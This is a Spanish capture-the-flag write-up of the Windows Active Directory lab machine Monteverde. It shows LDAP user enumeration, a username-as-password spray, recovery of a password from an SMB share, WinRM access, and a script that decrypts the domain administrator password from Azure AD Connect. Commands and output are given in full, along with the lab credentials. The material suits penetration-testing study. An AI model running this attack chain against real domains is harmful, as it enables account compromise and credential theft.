# Resolución maquina Monteverde

**Autor:** PepeMaquina.
**Fecha:** 17 de Marzo de 2026.
**Dificultad:** Medio.
**Sistema Operativo:** Windows.
**Tags:** User password, Azure AD, Password Hash Synchronisation.

---
## Imagen de la Máquina

![](monteverde.jpg)

*Imagen: Monteverde.JPG*
## Reconocimiento Inicial
### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 4000 -n -Pn 10.129.228.111 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p53,135,139,389,445,464,3268,3269,5985,9389,49667,49674,49676 10.129.228.111 -oN targeted
~~~
### Enumeración de Servicios
~~~bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-17T18:43:33
|_  start_date: N/A
~~~
### Enumeración de nombre del dominio
Lo primero que se realiza es la enumeración del dominio, para ello se intenta ingresar mediante credenciales nulas.
~~~ bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ sudo netexec smb 10.129.228.111 -u '' -p ''                                                       
[sudo] password for kali: 
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
~~~
Teniendo el domino se procede a ingresarlo al `/etc/hosts`.
~~~bash
┌──(kali㉿kali)-[/opt/bloodhound-ce]
└─$ cat /etc/hosts | grep 'MEGABANK.LOCAL'
10.129.228.111 MEGABANK.LOCAL monteverde monteverde.MEGABANK.LOCAL
~~~

Posteriormente se procedio a enumerar el protocolo SMB para ver recursos compartidos tanto con credenciales nulas como invitado.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ sudo netexec smb 10.129.228.111 -u '' -p '' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.129.228.111  445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
~~~
Lastimosamente eso no es posible.

Posteriormente se procedio a enumerar el protocolo LDAP, con `ldapserarch`.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ ldapsearch -x -H ldap://10.129.228.111 -D '' -w '' -b "DC=megabank,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=megabank,DC=local> with scope subtree
<----SNIP---->
~~~
LDAP entrega bastante información, asi que se puede filtrarlo para obtener unicamente usuario y descripciones.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ ldapsearch -x -H ldap://10.129.228.111 -D '' -w '' -b "DC=megabank,DC=local" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
Guest
MONTEVERDE$
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
~~~
Posteriormente se agrega todo en un archivo para tener los usuarios la mano, de igual forma se puede obtener todo esto con `netexec` y es incluso mas facil.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde/content]
└─$ sudo netexec ldap 10.129.228.111 -u '' -p '' --users                                 
[sudo] password for kali: 
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\: 
LDAP        10.129.228.111  389    MONTEVERDE       [*] Enumerated 10 domain users: MEGABANK.LOCAL
LDAP        10.129.228.111  389    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW-  -Description-                                
LDAP        10.129.228.111  389    MONTEVERDE       Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.228.111  389    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 17:53:24 0        Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
LDAP        10.129.228.111  389    MONTEVERDE       mhope                         2020-01-02 18:40:05 0                                                     
LDAP        10.129.228.111  389    MONTEVERDE       SABatchJobs                   2020-01-03 07:48:46 0                                                     
LDAP        10.129.228.111  389    MONTEVERDE       svc-ata                       2020-01-03 07:58:31 0                                                     
LDAP        10.129.228.111  389    MONTEVERDE       svc-bexec                     2020-01-03 07:59:55 0                                                     
LDAP        10.129.228.111  389    MONTEVERDE       svc-netapp                    2020-01-03 08:01:42 0                                                     
LDAP        10.129.228.111  389    MONTEVERDE       dgalanos                      2020-01-03 08:06:10 0                                                     
LDAP        10.129.228.111  389    MONTEVERDE       roleary                       2020-01-03 08:08:05 0                                                     
LDAP        10.129.228.111  389    MONTEVERDE       smorgan                       2020-01-03 08:09:21 0 
~~~

Con credenciales encontradas, lo primero que se realizo fue realizar ataque ASRProast pero no fue efectiva.
Porteriormente se probo los nombres de usuario como contraseña para ver si se reusan.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ sudo netexec smb 10.129.228.111 -u users -p users --continue-on-success 
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)                                                                      <----SNIP---->     
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE  
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:SABatchJobs STATUS_LOGON_FAILURE
<----SNIP---->
~~~
Se logro encontrar unas credenciales validas, por lo que se puede realizar aun mas enumeración, lo primero es revisar recursos compartidos.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ sudo netexec smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --shares              
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)                                                                                                                                                 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ           
~~~
Se puede ver carpetas como `users$` y `azure_uploads`.
Al revisar `azure_uploads` no se logro encontrar gran cosa, pero al revisar `users$` se logro encontrar un archivo extraño.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ smbclient '//10.129.228.111/users$' -U 'SABatchJobs'           
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> recurive ON
recurive: command not found
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

\dgalanos
  .                                   D        0  Fri Jan  3 08:12:30 2020
  ..                                  D        0  Fri Jan  3 08:12:30 2020

\mhope
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

\roleary
  .                                   D        0  Fri Jan  3 08:10:30 2020
  ..                                  D        0  Fri Jan  3 08:10:30 2020

\smorgan
  .                                   D        0  Fri Jan  3 08:10:24 2020
  ..                                  D        0  Fri Jan  3 08:10:24 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> recurse OFF
smb: \> cd mhope\
smb: \mhope\> get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \mhope\> exit
~~~
Se logro encontrar un `azure.xml`, en su contenido existe una credencial.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde/content]
└─$ cat azure.xml                   
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>  
~~~
Al probar esta contraseña con todos los usuarios se logro encontrar una coincidencia.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ sudo netexec smb 10.129.228.111 -u users -p '4n0therD4y@n0th3r$' --continue-on-success
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)                                                                                                                                                 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
~~~

Al revisar los grupos con LDAP, se puede ver que este usuario pertenece al grupo  `Remote Management Users` por lo que puede ingresar por winrm.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ ldapsearch -x -H ldap://10.129.228.111 -b "DC=megabank,DC=local" "(objectClass=user)" memberOf
# extended LDIF
#
# LDAPv3
# base <DC=megabank,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: memberOf 
#

# Guest, Users, MEGABANK.LOCAL
dn: CN=Guest,CN=Users,DC=MEGABANK,DC=LOCAL
memberOf: CN=Guests,CN=Builtin,DC=MEGABANK,DC=LOCAL

# MONTEVERDE, Domain Controllers, MEGABANK.LOCAL
dn: CN=MONTEVERDE,OU=Domain Controllers,DC=MEGABANK,DC=LOCAL

# AAD_987d7f2f57d2, Users, MEGABANK.LOCAL
dn: CN=AAD_987d7f2f57d2,CN=Users,DC=MEGABANK,DC=LOCAL
memberOf: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
memberOf: CN=Users,CN=Builtin,DC=MEGABANK,DC=LOCAL

# Mike Hope, London, MegaBank Users, MEGABANK.LOCAL
dn: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
memberOf: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
memberOf: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
<----SNIP---->
~~~

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`
### User Flag
Con acceso winrm mediante el usuario "mhope" se puede ver la bandera.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde]
└─$ evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'                                                                             
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion'
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..
*Evil-WinRM* PS C:\Users\mhope> type /desktop/user.txt
<Encuentre su propia user flag>
~~~

---
## Escalada de Privilegios
Para escalar privilegios se realizo enumeracion manual, con esto se logro observar que este usuario pertenece a un grupo inusual llamado `azure admins`.
~~~bash
*Evil-WinRM* PS C:\Users\mhope> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label  
~~~

Este grupo es especial porque puede que tenga permisos extras enfocados en `azure`, averiguando en internet se puedo ver un articulo (https://blog.xpnsec.com/azuread-connect-for-redteam/) que menciona sobre posibles ataques que se puede realizar.
Basicamente se puede realizar un `Password Hash Synchronisation`, esto porque seguramente existe un proceso en el que Azure envia las credenciales desde el DC hacia Azure, para ello se necesita un usuario de la DB que tendria permisos para realizar un DCSync, este ataque es un poco sofisticado.
Para ello existe un script que aprovecha el uso de `mcrypt.dll` dentro del directorio `C:\Program Files\Microsoft Azure AD Sync`, este `dll` es el que se encarga de desencriptar hashes y contraseñas, para ello entra en juego el siguiente script (https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor).
Descargando el script y ejecutandolo.
~~~bash
*Evil-WinRM* PS C:\Users\mhope\Documents> .\decrypt.ps1

Attempting connection: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True
Error connecting to SQL database. Trying next...
Exception Message: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
Attempting connection: Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True
Connection successful!
Loading mcrypt.dll from: C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
~~~
Se puede ver que descencripto una contraseña para el usuario administrator.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con credenciales de administrator se puede iniciar sesion por winrm.
~~~bash
┌──(kali㉿kali)-[~/htb/monteverde/exploits]
└─$ evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion'
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/17/2026  11:40 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
<Encuentre su propia root flag>
~~~
🎉 Sistema completamente comprometido - Root obtenido












